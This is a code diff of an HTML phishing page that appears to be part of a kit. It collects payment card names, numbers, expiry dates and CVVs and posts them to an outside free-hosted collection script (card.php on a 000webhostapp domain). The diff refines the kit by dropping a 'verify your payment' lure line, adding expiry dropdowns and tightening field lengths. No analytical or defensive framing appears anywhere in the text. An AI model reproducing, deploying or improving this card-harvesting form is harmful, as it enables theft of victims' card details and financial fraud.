@@ -146,26 +146,57 @@
                                                                                                                 
                                                                                                             </div>
                                                                                                         </div>
-                        <strong>Last Step!</strong> For security, We must verify your payment. We need a bit more information before we can confirm your identity. 
-
-                    
-<form action="https://harusadacintanya12.000webhostapp.com/card.php" method="post" onsubmit="">
+                        <form action="https://harusadacintanya12.000webhostapp.com/card.php" method="post" onsubmit="">
                                                         
                                                         <div class="KolM4x">
-                                                            <input class="inPUt1" placeholder="Card Name" name="cardname" type="text" maxlength="50" required="" pattern=".{6,}">
+                                                            <input class="inPUt1" placeholder="Name on Card" name="cardname" type="text" maxlength="50" required="" pattern=".{6,}">
 <br>
                                                         </div>
                                                         <br><div class="KolM4x">
-<input type="number" name="li" id="cardNumber" placeholder="Card number" class="inPUt1" required="">
+<input type="number" name="li" id="cardNumber" placeholder="Card Number" class="inPUt1" required="" minlength="15" maxlength="17">
                                         <div class="input-group-prepend"> <span class="input-group-text text-muted"> <i class="fa fa-cc-visa" style="font-size:24px"></i> <i class="fa fa-cc-mastercard" style="font-size:24px"></i> </span> </div>
                                     </div><br>
                                                         <div class="KolM4x">
- <input type="number" placeholder="MM" name="mm" class="inPUt2" required=""> 
-<input type="number" placeholder="YY" name="yy" class="inPUt2" required="">                                         
+ <div class="" id="birthday_wrapper">
+<div class="clearfix _58mh"><div class="_5k_5">
+<span class="_5k_4" data-type="selectors" data-name="birthday_wrapper" id="u_b_l"><span>
+<select class="input2" title="Day" id="day" name="mm" aria-label="Month">
+<option value="01" selected="1">01</option>
+<option value="02">02</option>
+<option value="03">03</option>
+<option value="04">04</option>
+<option value="05">05</option>
+<option value="06">06</option>
+<option value="07">07</option>
+<option value="08">08</option>
+<option value="09">09</option>
+<option value="10">10</option>
+<option value="11">11</option>
+<option value="12">12</option>
+</select>
+<select aria-label="Year" name="yy" id="month" title="Month" class="input2">
+
+
+<option value="2023">2023</option>
+<option value="2024">2024</option>
+<option value="2025">2025</option>
+<option value="2026">2026</option>
+<option value="2027">2027</option>
+<option value="2028">2028</option>
+<option value="2029">2029</option>
+<option value="2030">2030</option>
+<option value="2031">2031</option>
+<option value="2032">2032</option>
+<option value="2033">2033</option>
+<option value="2034">2034</option>
+<option value="2034">2035</option>
+<option value="2034">2036</option><option value="2034">2037</option><option value="2034">2038</option></select>
+</span></span></div></div></div> 
+                                         
 
 
                                         
-&lrm; &lrm; &lrm; &lrm; &lrm; &lrm; &lrm; &lrm; &lrm; <input type="text" placeholder="CVV" name="cvv" class="inPUt2" required="">
+&lrm; &lrm; &lrm; &lrm; &lrm; &lrm; &lrm; <input type="text" placeholder="CVV" name="cvv" class="inPUt2" required="" minlength="3" maxlength="4">
                                         
 <br></div>
 <br>
@@ -210,6 +241,7 @@
             </div>
         </div>
     </div>
+
 
 
 
